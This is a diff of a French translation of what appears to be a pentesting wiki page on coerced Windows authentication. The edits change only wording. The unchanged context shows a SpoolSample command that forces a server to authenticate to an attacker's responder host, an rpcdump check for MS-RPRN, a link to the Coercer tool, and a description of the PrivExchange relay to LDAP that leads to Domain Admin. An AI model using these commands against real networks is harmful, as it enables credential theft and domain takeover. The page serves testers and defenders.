@@ -28,9 +28,9 @@ Vous pouvez également utiliser rpcdump.py sur Linux et rechercher le protocole 
 ```bash
 rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
-### Demander au service de s'authentifier contre un hôte arbitraire
+### Demandez au service de s'authentifier contre un hôte arbitraire
 
-Vous pouvez compiler[ **SpoolSample à partir d'ici**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
+Vous pouvez compiler[ **SpoolSample depuis ici**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
 ```bash
 SpoolSample.exe <TARGET> <RESPONDERIP>
 ```
@@ -45,15 +45,16 @@ Si un attaquant a déjà compromis un ordinateur avec [Unconstrained Delegation]
 
 ## Authentification RCP Forcée
 
+
 {{#ref}}
 https://github.com/p0dalirius/Coercer
 {{#endref}}
 
 ## PrivExchange
 
-L'attaque `PrivExchange` est le résultat d'un défaut trouvé dans la **fonctionnalité `PushSubscription` du serveur Exchange**. Cette fonctionnalité permet au serveur Exchange d'être forcé par tout utilisateur de domaine disposant d'une boîte aux lettres à s'authentifier auprès de tout hôte fourni par le client via HTTP.
+L'attaque `PrivExchange` est le résultat d'un défaut trouvé dans la **fonctionnalité `PushSubscription` du serveur Exchange**. Cette fonctionnalité permet au serveur Exchange d'être forcé par tout utilisateur de domaine avec une boîte aux lettres à s'authentifier auprès de tout hôte fourni par le client via HTTP.
 
-Par défaut, le **service Exchange s'exécute en tant que SYSTEM** et se voit accorder des privilèges excessifs (en particulier, il dispose de **privilèges WriteDacl sur le domaine avant la mise à jour cumulative de 2019**). Ce défaut peut être exploité pour permettre le **transfert d'informations vers LDAP et ensuite extraire la base de données NTDS du domaine**. Dans les cas où le transfert vers LDAP n'est pas possible, ce défaut peut encore être utilisé pour transférer et s'authentifier auprès d'autres hôtes au sein du domaine. L'exploitation réussie de cette attaque accorde un accès immédiat à l'Administrateur de Domaine avec n'importe quel compte utilisateur de domaine authentifié.
+Par défaut, le **service Exchange s'exécute en tant que SYSTEM** et se voit accorder des privilèges excessifs (en particulier, il a des **privilèges WriteDacl sur le domaine avant la mise à jour cumulative de 2019**). Ce défaut peut être exploité pour permettre le **transfert d'informations vers LDAP et ensuite extraire la base de données NTDS du domaine**. Dans les cas où le transfert vers LDAP n'est pas possible, ce défaut peut encore être utilisé pour transférer et s'authentifier auprès d'autres hôtes au sein du domaine. L'exploitation réussie de cette attaque accorde un accès immédiat à l'Administrateur de Domaine avec n'importe quel compte utilisateur de domaine authentifié.
 
 ## À l'intérieur de Windows
 
